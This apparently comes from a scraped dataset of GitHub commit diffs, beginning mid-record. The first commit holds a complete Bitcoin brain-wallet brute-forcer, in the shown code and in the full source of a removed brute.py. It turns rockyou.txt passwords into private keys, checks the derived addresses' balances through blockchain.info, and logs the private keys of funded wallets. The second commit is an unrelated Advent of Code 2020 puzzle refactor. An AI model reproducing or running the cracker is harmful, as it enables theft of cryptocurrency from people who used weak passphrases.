generate_addresses(n)\n                url = create_url(addresses, n)\n\n                req2 = requests.get(url)\n                if req2.status_code == 200:\n                    content2 = req2.content\n\n                    addresses2 = json.loads(content2.decode(\"utf-8\"))\n                    for xy in addresses2:\n                        if addresses2['%s' % xy]['final_balance'] != 0:\n                            for xyz in range(0, n):\n                                if addresses[xyz][1] == xy:\n                                    output = (\"PublicKey:%s Balance:%s PrivateKey:%s\" % (\n                                        xy, addresses2['%s' % xy]['final_balance'], addresses[xyz][0]))\n                                    print(output)\n                                    write_logs(\"keys\", output)\n                        if addresses2['%s' % xy]['total_received'] != 0:\n                            for xyz in range(0, n):\n                                if addresses[xyz][1] == xy:\n                                    output = (\"PublicKey:%s Received:%s PrivateKey:%s\" % (\n                                        xy, addresses2['%s' % xy]['total_received'], addresses[xyz][0]))\n                                    print(output)\n                                    write_logs(\"keys\", output)\n                    total += 128\n\n                else:\n                    print(\"%s - Error - Status Code: %s - URL: %s\" % (ctime(), req2.status_code, url))\n\n            except TimeoutError:\n                output = (\"%s - ERROR - TimeoutError - URL: %s\" % (ctime(), url))\n                print(output)\n                write_logs(\"error\", output)\n\n\nfor x in range(0, 1):\n    a = Th(x)\n    a.start()\n\nwhile True:\n    time.sleep(10)\n    print(\"%s - INFO - Total verified: %s\" % (ctime(), total))\n"},"\/brute.py":{"changes":[{"diff":"\n-#!\/usr\/bin\/python3\r\n-\r\n-from bitcoin import *\r\n-import requests\r\n-import json\r\n-import os\r\n-\r\n-list = []\r\n-\r\n-with open(\"E:\/rockyou.txt\", errors=\"ignore\") as fp:\r\n-    file_name = os.path.basename(fp.name)\r\n-    print(file_name)\r\n-    for i, line in enumerate(fp):\r\n-        if i > int(open('state', 'r').read().split(\":\")[1]):\r\n-            if len(list) < 128:\r\n-                wallet = [sha256(line), pubtoaddr(privtopub(sha256(line)))]\r\n-                list.append(wallet)\r\n-\r\n-            else:\r\n-                #print(list)\r\n-                addresses = \"\"\r\n-                for y in range(0, 128):\r\n-                    addresses += str(list[y][1])\r\n-\r\n-                    if y < 127:\r\n-                        addresses += \"|\"\r\n-\r\n-                req2 = requests.get(\"https:\/\/blockchain.info\/balance?active=%s\" % addresses)\r\n-                content2 = req2.content\r\n-\r\n-                addresses2 = json.loads(content2.decode(\"utf-8\"))\r\n-                for xy in addresses2:\r\n-                    if addresses2['%s' % xy]['final_balance'] != 0:\r\n-                        for xyz in range(0, 128):\r\n-                            if list[xyz][1] == xy:\r\n-                                output = (\"PublicKey:%s Balance:%s PrivateKey:%s\" % (\r\n-                                          xy, addresses2['%s' % xy]['final_balance'], list[xyz][0]))\r\n-                                print(output)\r\n-                                #os.system('echo %s >> \/home\/pi\/keys.txt' % output)\r\n-\r\n-                    if addresses2['%s' % xy]['total_received'] != 0:\r\n-                        for xyz in range(0, 128):\r\n-                            if list[xyz][1] == xy:\r\n-                                output = (\"PublicKey:%s Received:%s PrivateKey:%s\" % (\r\n-                                          xy, addresses2['%s' % xy]['total_received'], list[xyz][0]))\r\n-                                print(output)\r\n-                                #os.system('echo %s >> \/home\/pi\/keys.txt' % output)\r\n-\r\n-                list = []\r\n-                f = open(\"state\", \"w\")\r\n-                f.write(\"%s:%s\" % (file_name, i))\r\n-                f.close()\r\n","add":0,"remove":52,"filename":"\/brute.py","badparts":["\r","from bitcoin import *\r","import requests\r","import json\r","\r","list = []\r","\r","with open(\"E:\/rockyou.txt\", errors=\"ignore\") as fp:\r","    file_name = os.path.basename(fp.name)\r","    print(file_name)\r","    for i, line in enumerate(fp):\r","        if i > int(open('state', 'r').read().split(\":\")[1]):\r","            if len(list) < 128:\r","                wallet = [sha256(line), pubtoaddr(privtopub(sha256(line)))]\r","                list.append(wallet)\r","\r","            else:\r","                addresses = \"\"\r","                for y in range(0, 128):\r","                    addresses += str(list[y][1])\r","\r","                    if y < 127:\r","                        addresses += \"|\"\r","\r","                req2 = requests.get(\"https:\/\/blockchain.info\/balance?active=%s\" % addresses)\r","                content2 = req2.content\r","\r","                addresses2 = json.loads(content2.decode(\"utf-8\"))\r","                for xy in addresses2:\r","                    if addresses2['%s' % xy]['final_balance'] != 0:\r","                        for xyz in range(0, 128):\r","                            if list[xyz][1] == xy:\r","                                output = (\"PublicKey:%s Balance:%s PrivateKey:%s\" % (\r","                                          xy, addresses2['%s' % xy]['final_balance'], list[xyz][0]))\r","                                print(output)\r","\r","                    if addresses2['%s' % xy]['total_received'] != 0:\r","                        for xyz in range(0, 128):\r","                            if list[xyz][1] == xy:\r","                                output = (\"PublicKey:%s Received:%s PrivateKey:%s\" % (\r","                                          xy, addresses2['%s' % xy]['total_received'], list[xyz][0]))\r","                                print(output)\r","\r","                list = []\r","                f = open(\"state\", \"w\")\r","                f.write(\"%s:%s\" % (file_name, i))\r","                f.close()\r"],"goodparts":[]}],"source":"\n\n\r from bitcoin import *\r import requests\r import json\r import os\r \r list=[]\r \r with open(\"E:\/rockyou.txt\", errors=\"ignore\") as fp:\r file_name=os.path.basename(fp.name)\r print(file_name)\r for i, line in enumerate(fp):\r if i > int(open('state', 'r').read().split(\":\")[1]):\r if len(list) < 128:\r wallet=[sha256(line), pubtoaddr(privtopub(sha256(line)))]\r list.append(wallet)\r \r else:\r addresses=\"\"\r for y in range(0, 128):\r addresses +=str(list[y][1])\r \r if y < 127:\r addresses +=\"|\"\r \r req2=requests.get(\"https:\/\/blockchain.info\/balance?active=%s\" % addresses)\r content2=req2.content\r \r addresses2=json.loads(content2.decode(\"utf-8\"))\r for xy in addresses2:\r if addresses2['%s' % xy]['final_balance'] !=0:\r for xyz in range(0, 128):\r if list[xyz][1]==xy:\r output=(\"PublicKey:%s Balance:%s PrivateKey:%s\" %(\r xy, addresses2['%s' % xy]['final_balance'], list[xyz][0]))\r print(output)\r \r if addresses2['%s' % xy]['total_received'] !=0:\r for xyz in range(0, 128):\r if list[xyz][1]==xy:\r output=(\"PublicKey:%s Received:%s PrivateKey:%s\" %(\r xy, addresses2['%s' % xy]['total_received'], list[xyz][0]))\r print(output)\r \r list=[]\r f=open(\"state\", \"w\")\r f.write(\"%s:%s\" %(file_name, i))\r f.close()\r ","sourceWithComments":"#!\/usr\/bin\/python3\r\n\r\nfrom bitcoin import *\r\nimport requests\r\nimport json\r\nimport os\r\n\r\nlist = []\r\n\r\nwith open(\"E:\/rockyou.txt\", errors=\"ignore\") as fp:\r\n    file_name = os.path.basename(fp.name)\r\n    print(file_name)\r\n    for i, line in enumerate(fp):\r\n        if i > int(open('state', 'r').read().split(\":\")[1]):\r\n            if len(list) < 128:\r\n                wallet = [sha256(line), pubtoaddr(privtopub(sha256(line)))]\r\n                list.append(wallet)\r\n\r\n            else:\r\n                #print(list)\r\n                addresses = \"\"\r\n                for y in range(0, 128):\r\n                    addresses += str(list[y][1])\r\n\r\n                    if y < 127:\r\n                        addresses += \"|\"\r\n\r\n                req2 = requests.get(\"https:\/\/blockchain.info\/balance?active=%s\" % addresses)\r\n                content2 = req2.content\r\n\r\n                addresses2 = json.loads(content2.decode(\"utf-8\"))\r\n                for xy in addresses2:\r\n                    if addresses2['%s' % xy]['final_balance'] != 0:\r\n                        for xyz in range(0, 128):\r\n                            if list[xyz][1] == xy:\r\n                                output = (\"PublicKey:%s Balance:%s PrivateKey:%s\" % (\r\n                                          xy, addresses2['%s' % xy]['final_balance'], list[xyz][0]))\r\n                                print(output)\r\n                                #os.system('echo %s >> \/home\/pi\/keys.txt' % output)\r\n\r\n                    if addresses2['%s' % xy]['total_received'] != 0:\r\n                        for xyz in range(0, 128):\r\n                            if list[xyz][1] == xy:\r\n                                output = (\"PublicKey:%s Received:%s PrivateKey:%s\" % (\r\n                                          xy, addresses2['%s' % xy]['total_received'], list[xyz][0]))\r\n                                print(output)\r\n                                #os.system('echo %s >> \/home\/pi\/keys.txt' % output)\r\n\r\n                list = []\r\n                f = open(\"state\", \"w\")\r\n                f.write(\"%s:%s\" % (file_name, i))\r\n                f.close()\r\n"}},"msg":"Improved code and joined brute force part to same file"}},"https:\/\/github.com\/mmertama\/advent-of-code-2020":{"635cc8c2bba7551746eb8fc413d23fd75f5b95aa":{"url":"https:\/\/api.github.com\/repos\/mmertama\/advent-of-code-2020\/commits\/635cc8c2bba7551746eb8fc413d23fd75f5b95aa","html_url":"https:\/\/github.com\/mmertama\/advent-of-code-2020\/commit\/635cc8c2bba7551746eb8fc413d23fd75f5b95aa","message":"improved brute force for day20","sha":"635cc8c2bba7551746eb8fc413d23fd75f5b95aa","keyword":"brute force improve","diff":"diff --git a\/advent_of_code.py b\/advent_of_code.py\nindex 0f4ce42..2dd0059 100644\n--- a\/advent_of_code.py\n+++ b\/advent_of_code.py\n@@ -164,10 +164,9 @@ def read_input(fn):\n     day19.find_matches(read_input('data\/input19.txt'), read_example(day19.update))\n     '''\n \n-#    day20.calc_roughness(read_example(day20.test), len(day20.has_monster(read_example(day20.test))))\n-    #day20.manage_images(read_example(day20.example))\n-    #day20.manage_images(read_input('data\/input20.txt'))\n+    day20.manage_images(read_example(day20.example))\n+    day20.manage_images(read_input('data\/input20.txt'))\n \n-    day21.find_safe_food(read_example(day21.example))\n-    day21.find_safe_food(read_input('data\/input21.txt'))\n+    #day21.find_safe_food(read_example(day21.example))\n+    #day21.find_safe_food(read_input('data\/input21.txt'))\n \ndiff --git a\/day20.py b\/day20.py\nindex 63807ee..46084c5 100644\n--- a\/day20.py\n+++ b\/day20.py\n@@ -164,20 +164,22 @@ def run():\n                 for r in ranges:\n                     if borders_i[r[0]] == borders_j[r[1]]:\n                         matches.append((current_i, current_j, r[0], r[1]))\n-            if len(matches) < 1:\n+            if len(matches) < 2:\n                 current_tile_i['op'] += 1\n                 if current_tile_i['op'] >= len(ops):\n                     nonlocal deadlock_ops\n+                    deadlock_ops[0] += 1\n+                    for index in range(1, len(deadlock_ops)):\n+                        if deadlock_ops[index - 1] < len(ops):\n+                            break\n+                        if index > 2:\n+                            print(\".\", flush=True, end=\"\" if index < 5 else \"\\n\")\n+                        deadlock_ops[index] += 1\n+                        deadlock_ops[index - 1] = 0\n+                    assert deadlock_ops[-1] < len(ops)\n                     for index in range(0, len(keys)):\n                         key = keys[index]\n                         images[key]['op'] = deadlock_ops[index]\n-                    images[deadlock_ops[0]]['op'] += 1\n-                    for index in range(1, len(keys)):\n-                        if images[deadlock_ops[i - 1]]['op'] < len(ops):\n-                            break\n-                        images[deadlock_ops[i]]['op'] += 1\n-                        images[deadlock_ops[i - 1]]['op'] = 0\n-                    assert images[deadlock_ops[-1]]['op'] < len(ops)\n                 return False\n             all_matches.append(matches)\n         print(\"do we have corners?\", len([x for x in all_matches if len(x) == 2]))\n@@ -202,7 +204,6 @@ def run():\n                         set_neigh(images, key_i, borders_i.index(bi), key_j)\n \n \n-\n def get_corners(images):\n     corner_list = []\n     for k, v in images.items():\n@@ -239,32 +240,6 @@ def image_flip_vertical(data):\n     return new_data\n \n \n-test = '''.#.#..#.##...#.##..#####\n-###....#.#....#..#......\n-##.##.###.#.#..######...\n-###.#####...#.#####.#..#\n-##.#....#.##.####...#.##\n-...########.#....#####.#\n-....#..#...##..#.#.###..\n-.####...#..#.....#......\n-#..#.##..#..###.#.##....\n-#.####..#.####.#.#.###..\n-###.#.#...#.######.#..##\n-#.####....##..########.#\n-##..##.#...#...#.#.#.#..\n-...#..#..#.#.##..###.###\n-.#.#....#.##.#...###.##.\n-###.#...#..#.##.######..\n-.#.#.###.##.##.#..#.##..\n-.####.###.#...###.#..#.#\n-..#.#..#..#.#.#.####.###\n-#..####...#.#.#.###.###.\n-#####..#####...###....##\n-#.##..#..#...#..####...#\n-.#.###..##..##..####.##.\n-...###...##...#...#..###'''\n-\n-\n def has_monster(sea_data):\n     monsters = [seamonster,\n                 image_flip_vertical(seamonster),\n@@ -302,7 +277,7 @@ def has_monster(sea_data):\n                         break\n                 if found:\n                     monsters_found.append((i, j, monsters.index(monster)))\n-    print(monsters_found)\n+    #print(monsters_found)\n     return monsters_found\n \n \n@@ -312,8 +287,7 @@ def calc_sharps(image):\n         for line in image:\n             sharps += sum(map(lambda x: 1 if '#' in x else 0, line))\n         return sharps\n-\n-    print(calc_sharps(data) - monsters * calc_sharps(seamonster))\n+    return calc_sharps(data) - monsters * calc_sharps(seamonster)\n \n \n def order_tiles(images):\n@@ -342,22 +316,6 @@ def order_tiles(images):\n         if left_one is None:\n             break\n \n-    print(\"***\")\n-    for line in grid:\n-        for cell in line:\n-            print(cell, end=\" \")\n-        print(\" \")\n-\n-    print(\"***\")\n-    for line in grid:\n-        line_count = len(images[list(images.keys())[0]]['data'])\n-        for ln in range(0, line_count):\n-            for cell in line:\n-                print(images[cell]['data'][ln], end=\"\")\n-                print(\" \", end=\" \")\n-            print(\" \")\n-        print(\" \")\n-\n     return grid\n \n \n@@ -371,8 +329,6 @@ def make_sea_image(images, grid):\n                 line += content\n             data.append(line)\n \n-    print(\"\\n\".join(data))\n-\n     return data\n \n \n@@ -405,23 +361,34 @@ def manage_images(data):\n \n     mul = 1\n     for m in get_corners(images):\n-       mul *= int(m)\n+        mul *= int(m)\n     print(\"corners:\", mul)\n \n     grid = order_tiles(images)\n \n-    #grid = [['1951','2311','3079'],\n-    #     ['2729','1427','2473'],\n-    #    ['2971','1489','1171']]\n+    '''\n+    print(\"***\")\n+    for line in grid:\n+        for cell in line:\n+            print(cell, end=\" \")\n+        print(\" \")\n+\n+    print(\"***\")\n+    for line in grid:\n+        line_count = len(images[list(images.keys())[0]]['data'])\n+        for ln in range(0, line_count):\n+            for cell in line:\n+                print(images[cell]['data'][ln], end=\"\")\n+                print(\" \", end=\" \")\n+            print(\" \")\n+        print(\" \")\n+    '''\n \n     sea_image = make_sea_image(images, grid)\n \n-    mon = has_monster(sea_image)\n-    if mon is not None:\n-        print(\"Monster!\", mon)\n-    else:\n-        print(\"No Monster\")\n+    #print(\"\\n\".join(data))\n \n-    calc_roughness(sea_image, len(mon))\n+    mon = has_monster(sea_image)\n+    print(\"Roughness: \", calc_roughness(sea_image, len(mon)))\n \n \n","files":{"\/advent_of_code.py":{"changes":[{"diff":"\n     day19.find_matches(read_input('data\/input19.txt'), read_example(day19.update))\n     '''\n \n-#    day20.calc_roughness(read_example(day20.test), len(day20.has_monster(read_example(day20.test))))\n-    #day20.manage_images(read_example(day20.example))\n-    #day20.manage_images(read_input('data\/input20.txt'))\n+    day20.manage_images(read_example(day20.example))\n+    day20.manage_images(read_input('data\/input20.txt'))\n \n-    day21.find_safe_food(read_example(day21.example))\n-    day21.find_safe_food(read_input('data\/input21.txt'))\n+    #day21.find_safe_food(read_example(day21.example))\n+    #day21.find_safe_food(read_input('data\/input21.txt'))\n ","add":4,"remove":5,"filename":"\/advent_of_code.py","badparts":["    day21.find_safe_food(read_example(day21.example))","    day21.find_safe_food(read_input('data\/input21.txt'))"],"goodparts":["    day20.manage_images(read_example(day20.example))","    day20.manage_images(read_input('data\/input20.txt'))"]}],"source":"\nimport day1 import day2 import day3 import day4 import day5 import day6 import day7 import day8 import day9 import day10 import day11 import day12 import day13 import day14 import day15 import day16 import day17 import day18 import day19 import day20 import day21 import time def read_example(str): return str.splitlines() def read_input(fn): lines=[] with open(fn) as f: for l in f: lines.append(l.rstrip()) return lines if __name__==\"__main__\": ''' print(\"day 1\") day1.find_two_factors(read_input('data\/input.txt')) day1.find_three_factors(read_input('data\/input.txt')) print(\"day 2\") day2.validate_passwords(read_input('data\/input2.txt')) day2.validate_passwords_2(read_input('data\/input2.txt')) print(\"day 3\") day3.navigate_thru_trees1(3, 1, read_input('data\/input3.txt')) day3.navigate_thru_trees2(read_input('data\/input3.txt')) print(\"day 4\") day4.check_passports_loose(read_input('data\/input4.txt')) day4.check_passports_strict(read_input('data\/input4.txt')) print(\"day 5\") day5.find_seat(read_input('data\/input5.txt')) print(\"day 6\") day6.check_custom_declaration_forms_any(read_input('data\/input6.txt')) day6.check_custom_declaration_forms_all(read_input('data\/input6.txt')) print(\"day 7\") day7.luggage_processor(read_input('data\/input7.txt'), 'shiny gold') day7.luggage_processor_content(read_input('data\/input7.txt'), 'shiny gold') print(\"day 8\") day8.detect_loop(read_input('data\/input8.txt')) day8.detect_invalid_instruction(read_input('data\/input8.txt')) print(\"day 9\") day9.find_mismatch(25, read_input('data\/input9.txt')) day9.find_contiguous_range(25, read_input('data\/input9.txt')) print(\"day 10\") day10.find_jolts(read_input('data\/input10.txt')) day10.find_jolt_permutations(read_input('data\/input10.txt')) print(\"day 11\") day11.seat_occupation_count(read_input('data\/input11.txt')) day11.seat_occupation_count_sight(read_input('data\/input11.txt')) print(\"day 12\") day12.navigation_distance(read_input('data\/input12.txt')) day12.navigation_distance_waypoint(read_input('data\/input12.txt')) print(\"day13\") day13.find_bus(read_input('data\/input13.txt')) day13.find_timestamp(read_input('data\/input13.txt')) print(\"day14\") day14.init_program(read_input('data\/input14.txt')) day14.init_program_2(read_input('data\/input14.txt')) print(\"day15\") day15.play_memory(day15.data, 2020) day15.play_memory(day15.data, 30000000) day16.ticket_errors_scan(read_input('data\/input16.txt')) day16.find_my_ticket_departure(read_input('data\/input16.txt')) day17.boot_cubes(read_input('data\/input17.txt'), 3, 6) day17.boot_cubes(read_input('data\/input17.txt'), 4, 6) day18.calc(read_input('data\/input18.txt')) day18.calc2(read_input('data\/input18.txt')) day19.find_matches(read_input('data\/input19.txt')) day19.find_matches(read_input('data\/input19.txt'), read_example(day19.update)) ''' day21.find_safe_food(read_example(day21.example)) day21.find_safe_food(read_input('data\/input21.txt')) ","sourceWithComments":"import day1\nimport day2\nimport day3\nimport day4\nimport day5\nimport day6\nimport day7\nimport day8\nimport day9\nimport day10\nimport day11\nimport day12\nimport day13\nimport day14\nimport day15\nimport day16\nimport day17\nimport day18\nimport day19\nimport day20\nimport day21\n\nimport time\n\n\ndef read_example(str):\n    return str.splitlines()\n\n\ndef read_input(fn):\n    lines = []\n    with open(fn) as f:\n        for l in f:\n            lines.append(l.rstrip())\n    return lines\n\n\nif __name__ == \"__main__\":\n    '''\n    print(\"day 1\")\n    #day1.find_two_factors(read_example(day1.example))\n    day1.find_two_factors(read_input('data\/input.txt'))\n    #day1.find_three_factors(read_example(day1.example))\n    day1.find_three_factors(read_input('data\/input.txt'))\n\n    print(\"day 2\")\n    #day2.validate_passwords(read_example(day2.example))\n    day2.validate_passwords(read_input('data\/input2.txt'))\n    #day2.validate_passwords_2(read_example(day2.example))\n    day2.validate_passwords_2(read_input('data\/input2.txt'))\n\n    print(\"day 3\")\n    #day3.navigate_thru_trees(3, 1, read_example(day3.example))\n    day3.navigate_thru_trees1(3, 1, read_input('data\/input3.txt'))\n    #day3.navigate_thru_trees2(read_example(day3.example))\n    day3.navigate_thru_trees2(read_input('data\/input3.txt'))\n\n    print(\"day 4\")\n    # day4.check_passports_loose(read_example(day4.example))\n    day4.check_passports_loose(read_input('data\/input4.txt'))\n    #day4.check_passports_strict(read_example(day4.example))\n    #day4.check_passports_strict(read_example(day4.example_invalids))\n    #day4.check_passports_strict(read_example(day4.example_valids))\n    day4.check_passports_strict(read_input('data\/input4.txt'))\n\n    print(\"day 5\")\n    #day5.find_seat(read_example(day5.example))\n    day5.find_seat(read_input('data\/input5.txt'))\n\n    print(\"day 6\")\n    #day6.check_custom_declaration_forms_any(read_example(day6.example))\n    day6.check_custom_declaration_forms_any(read_input('data\/input6.txt'))\n    #day6.check_custom_declaration_forms_all(read_example(day6.example))\n    day6.check_custom_declaration_forms_all(read_input('data\/input6.txt'))\n\n    print(\"day 7\")\n    #day7.luggage_processor(read_example(day7.example), 'shiny gold')\n    day7.luggage_processor(read_input('data\/input7.txt'), 'shiny gold')\n    #day7.luggage_processor_content(read_example(day7.example), 'shiny gold')\n    #day7.luggage_processor_content(read_example(day7.example2), 'shiny gold')\n    day7.luggage_processor_content(read_input('data\/input7.txt'), 'shiny gold')\n\n    print(\"day 8\")\n    #day8.detect_loop(read_example(day8.example))\n    day8.detect_loop(read_input('data\/input8.txt'))\n    #day8.detect_invalid_instruction(read_example(day8.example))\n    day8.detect_invalid_instruction(read_input('data\/input8.txt'))\n\n    print(\"day 9\")\n    #day9.find_mismatch(5, read_example(day9.example1))\n    day9.find_mismatch(25, read_input('data\/input9.txt'))\n    #day9.find_contiguous_range(5, read_example(day9.example1))\n    day9.find_contiguous_range(25, read_input('data\/input9.txt'))\n\n    print(\"day 10\")\n    #day10.find_jolts(read_example(day10.example1))\n    #day10.find_jolts(read_example(day10.example2))\n    day10.find_jolts(read_input('data\/input10.txt'))\n    #day10.find_jolt_permutations(read_example(day10.example1))\n    #day10.find_jolt_permutations(read_example(day10.example2))\n    day10.find_jolt_permutations(read_input('data\/input10.txt'))\n    \n    print(\"day 11\")\n    #day11.seat_occupation_count(read_example(day11.example))\n    day11.seat_occupation_count(read_input('data\/input11.txt'))\n    #day11.seat_occupation_count_sight(read_example(day11.example))\n    day11.seat_occupation_count_sight(read_input('data\/input11.txt'))\n    \n    print(\"day 12\")\n    #day12.navigation_distance(read_example(day12.example))\n    day12.navigation_distance(read_input('data\/input12.txt'))\n    #day12.navigation_distance_waypoint(read_example(day12.example))\n    day12.navigation_distance_waypoint(read_input('data\/input12.txt'))\n    \n    print(\"day13\")\n    #day13.find_bus(read_example(day13.example))\n    day13.find_bus(read_input('data\/input13.txt'))\n    #tic = time.perf_counter()\n    #day13.find_timestamp(read_example(day13.example5))\n    #toc = time.perf_counter()\n    #print(f\"timed: {toc - tic:0.4f} seconds\", flush=True)\n    #tic = time.perf_counter()\n    #day13.find_timestamp_dummy_but_much_faster(read_example(day13.example5))\n    #toc = time.perf_counter()\n    #print(f\"timed: {toc - tic:0.4f} seconds\", flush=True)\n    #tic = time.perf_counter()\n    day13.find_timestamp(read_input('data\/input13.txt'))\n    #toc = time.perf_counter()\n    #print(f\"timed: {toc - tic:0.4f} seconds\", flush=True)\n\n    print(\"day14\")\n    #day14.init_program(read_example(day14.example))\n    day14.init_program(read_input('data\/input14.txt'))\n    #day14.init_program_2(read_example(day14.example2))\n    day14.init_program_2(read_input('data\/input14.txt'))\n\n    print(\"day15\")\n    #day15.play_memory(day15.example1, 2020)\n    day15.play_memory(day15.data, 2020)\n    #tic = time.perf_counter()\n    day15.play_memory(day15.data, 30000000)\n    #toc = time.perf_counter()\n    #print(f\"timed: {toc - tic:0.4f} seconds\", flush=True)\n    \n    #day16.ticket_errors_scan(read_example(day16.example1))\n    day16.ticket_errors_scan(read_input('data\/input16.txt'))\n    day16.find_my_ticket_departure(read_input('data\/input16.txt'))\n\n  \n    #day17.boot_cubes(read_example(day17.example), 3, 6)\n    day17.boot_cubes(read_input('data\/input17.txt'), 3, 6)\n    #day17.boot_cubes(read_example(day17.example), 4, 6)\n    day17.boot_cubes(read_input('data\/input17.txt'), 4, 6)\n    \n    #day18.calc(read_example(day18.example1))\n    day18.calc(read_input('data\/input18.txt'))\n    #day18.calc2(read_example(day18.example1))\n    day18.calc2(read_input('data\/input18.txt'))\n    \n\n    #day19.find_matches(read_example(day19.example))\n    day19.find_matches(read_input('data\/input19.txt'))\n    #day19.find_matches(read_example(day19.example2), read_example(day19.update))\n    day19.find_matches(read_input('data\/input19.txt'), read_example(day19.update))\n    '''\n\n#    day20.calc_roughness(read_example(day20.test), len(day20.has_monster(read_example(day20.test))))\n    #day20.manage_images(read_example(day20.example))\n    #day20.manage_images(read_input('data\/input20.txt'))\n\n    day21.find_safe_food(read_example(day21.example))\n    day21.find_safe_food(read_input('data\/input21.txt'))\n\n"},"\/day20.py":{"changes":[{"diff":"\n                 for r in ranges:\n                     if borders_i[r[0]] == borders_j[r[1]]:\n                         matches.append((current_i, current_j, r[0], r[1]))\n-            if len(matches) < 1:\n+            if len(matches) < 2:\n                 current_tile_i['op'] += 1\n                 if current_tile_i['op'] >= len(ops):\n                     nonlocal deadlock_ops\n+                    deadlock_ops[0] += 1\n+                    for index in range(1, len(deadlock_ops)):\n+                        if deadlock_ops[index - 1] < len(ops):\n+                            break\n+                        if index > 2:\n+                            print(\".\", flush=True, end=\"\" if index < 5 else \"\\n\")\n+                        deadlock_ops[index] += 1\n+                        deadlock_ops[index - 1] = 0\n+                    assert deadlock_ops[-1] < len(ops)\n                     for index in range(0, len(keys)):\n                         key = keys[index]\n                         images[key]['op'] = deadlock_ops[index]\n-                    images[deadlock_ops[0]]['op'] += 1\n-                    for index in range(1, len(keys)):\n-                        if images[deadlock_ops[i - 1]]['op'] < len(ops):\n-                            break\n-                        images[deadlock_ops[i]]['op'] += 1\n-                        images[deadlock_ops[i - 1]]['op'] = 0\n-                    assert images[deadlock_ops[-1]]['op'] < len(ops)\n                 return False\n             all_matches.append(matches)\n         print(\"do we have corners?\", len([x for x in all_matches if len(x) == 2]))\n","add":10,"remove":8,"filename":"\/day20.py","badparts":["            if len(matches) < 1:","                    images[deadlock_ops[0]]['op'] += 1","                    for index in range(1, len(keys)):","                        if images[deadlock_ops[i - 1]]['op'] < len(ops):","                            break","                        images[deadlock_ops[i]]['op'] += 1","                        images[deadlock_ops[i - 1]]['op'] = 0","                    assert images[deadlock_ops[-1]]['op'] < len(ops)"],"goodparts":["            if len(matches) < 2:","                    deadlock_ops[0] += 1","                    for index in range(1, len(deadlock_ops)):","                        if deadlock_ops[index - 1] < len(ops):","                            break","                        if index > 2:","                            print(\".\", flush=True, end=\"\" if index < 5 else \"\\n\")","                        deadlock_ops[index] += 1","                        deadlock_ops[index - 1] = 0","                    assert deadlock_ops[-1] < len(ops)"]},{"diff":"\n     return new_data\n \n \n-test = '''.#.#..#.##...#.##..#####\n-###....#.#....#..#......\n-##.##.###.#.#..######...\n-###.#####...#.#####.#..#\n-##.#....#.##.####...#.##\n-...########.#....#####.#\n-....#..#...##..#.#.###..\n-.####...#..#.....#......\n-#..#.##..#..###.#.##....\n-#.####..#.####.#.#.###..\n-###.#.#...#.######.#..##\n-#.####....##..########.#\n-##..##.#...#...#.#.#.#..\n-...#..#..#.#.##..###.###\n-.#.#....#.##.#...###.##.\n-###.#...#..#.##.######..\n-.#.#.###.##.##.#..#.##..\n-.####.###.#...###.#..#.#\n-..#.#..#..#.#.#.####.###\n-#..####...#.#.#.###.###.\n-#####..#####...###....##\n-#.##..#..#...#..####...#\n-.#.###..##..##..####.##.\n-...###...##...#...#..###'''\n-\n-\n def has_monster(sea_data):\n     monsters = [seamonster,\n                 image_flip_vertical(seamonster),\n","add":0,"remove":26,"filename":"\/day20.py","badparts":["test = '''.#.#..#.##...#.##..#####","...########.#....#####.#","....#..#...##..#.#.###..","...#..#..#.#.##..###.###","...###...##...#...#..###'''"],"goodparts":[]},{"diff":"\n                         break\n                 if found:\n                     monsters_found.append((i, j, monsters.index(monster)))\n-    print(monsters_found)\n+    #print(monsters_found)\n     return monsters_found\n \n \n","add":1,"remove":1,"filename":"\/day20.py","badparts":["    print(monsters_found)"],"goodparts":[]},{"diff":"\n         for line in image:\n             sharps += sum(map(lambda x: 1 if '#' in x else 0, line))\n         return sharps\n-\n-    print(calc_sharps(data) - monsters * calc_sharps(seamonster))\n+    return calc_sharps(data) - monsters * calc_sharps(seamonster)\n \n \n def order_tiles(images):\n","add":1,"remove":2,"filename":"\/day20.py","badparts":["    print(calc_sharps(data) - monsters * calc_sharps(seamonster))"],"goodparts":["    return calc_sharps(data) - monsters * calc_sharps(seamonster)"]},{"diff":"\n         if left_one is None:\n             break\n \n-    print(\"***\")\n-    for line in grid:\n-        for cell in line:\n-            print(cell, end=\" \")\n-        print(\" \")\n-\n-    print(\"***\")\n-    for line in grid:\n-        line_count = len(images[list(images.keys())[0]]['data'])\n-        for ln in range(0, line_count):\n-            for cell in line:\n-                print(images[cell]['data'][ln], end=\"\")\n-                print(\" \", end=\" \")\n-            print(\" \")\n-        print(\" \")\n-\n     return grid\n \n \n","add":0,"remove":16,"filename":"\/day20.py","badparts":["    print(\"***\")","    for line in grid:","        for cell in line:","            print(cell, end=\" \")","        print(\" \")","    print(\"***\")","    for line in grid:","        line_count = len(images[list(images.keys())[0]]['data'])","        for ln in range(0, line_count):","            for cell in line:","                print(images[cell]['data'][ln], end=\"\")","                print(\" \", end=\" \")","            print(\" \")","        print(\" \")"],"goodparts":[]},{"diff":"\n                 line += content\n             data.append(line)\n \n-    print(\"\\n\".join(data))\n-\n     return data\n \n \n","add":0,"remove":2,"filename":"\/day20.py","badparts":["    print(\"\\n\".join(data))"],"goodparts":[]},{"diff":"\n \n     mul = 1\n     for m in get_corners(images):\n-       mul *= int(m)\n+        mul *= int(m)\n     print(\"corners:\", mul)\n \n     grid = order_tiles(images)\n \n-    #grid = [['1951','2311','3079'],\n-    #     ['2729','1427','2473'],\n-    #    ['2971','1489','1171']]\n+    '''\n+    print(\"***\")\n+    for line in grid:\n+        for cell in line:\n+            print(cell, end=\" \")\n+        print(\" \")\n+\n+    print(\"***\")\n+    for line in grid:\n+        line_count = len(images[list(images.keys())[0]]['data'])\n+        for ln in range(0, line_count):\n+            for cell in line:\n+                print(images[cell]['data'][ln], end=\"\")\n+                print(\" \", end=\" \")\n+            print(\" \")\n+        print(\" \")\n+    '''\n \n     sea_image = make_sea_image(images, grid)\n \n-    mon = has_monster(sea_image)\n-    if mon is not None:\n-        print(\"Monster!\", mon)\n-    else:\n-        print(\"No Monster\")\n+    #print(\"\\n\".join(data))\n \n-    calc_roughness(sea_image, len(mon))\n+    mon = has_monster(sea_image)\n+    print(\"Roughness: \", calc_roughness(sea_image, len(mon)))\n \n \n","add":21,"remove":10,"filename":"\/day20.py","badparts":["       mul *= int(m)","    mon = has_monster(sea_image)","    if mon is not None:","        print(\"Monster!\", mon)","    else:","        print(\"No Monster\")","    calc_roughness(sea_image, len(mon))"],"goodparts":["        mul *= int(m)","    '''","    print(\"***\")","    for line in grid:","        for cell in line:","            print(cell, end=\" 